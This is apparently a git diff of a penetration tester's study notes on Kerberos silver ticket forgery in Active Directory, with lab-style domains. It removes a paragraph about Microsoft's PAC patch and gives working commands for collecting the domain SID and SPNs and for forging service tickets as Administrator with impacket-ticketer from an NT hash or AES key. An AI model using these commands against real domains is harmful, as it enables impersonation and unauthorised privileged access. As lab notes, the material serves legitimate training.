@@ -253,13 +253,12 @@ Open a new terminal
 sudo ntpdate -s domain
 ```
 ### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
->Service hash required
+>Service acccount's hash required
 
 >Purpose:forge TGS ticket of certain service
- 
->Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
 
->Scenario: If ever gain the hash of computer account (DC01$), forge winrm, wmi, smb TGS
+>Scenario: If ever gain the hash of computer account (DC01$), forge winrm, wmi, smb TGS(It depends on what spn does dc01$ runs). Computer Account is also a kind of service account.
+
 ```
 Get Domain's sid:
 Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)
@@ -271,10 +270,10 @@ Get SPN:
 Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
 or
 Import-Module .\PowerView.ps1
-setspn -L svc_mssql
+setspn -L svc_mssql | setspn -L computer_account(such as dc01$ or web01$)
 
 Exploiting silver ticket:
-impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn doesnotmatter/dc.sequel.htb -user-id 500 Administrator
+impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn HOST/WEB01.corp.local(spn runs by the service account) -user-id 500 Administrator
 # To generate the TGS with AES key
 impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator
 
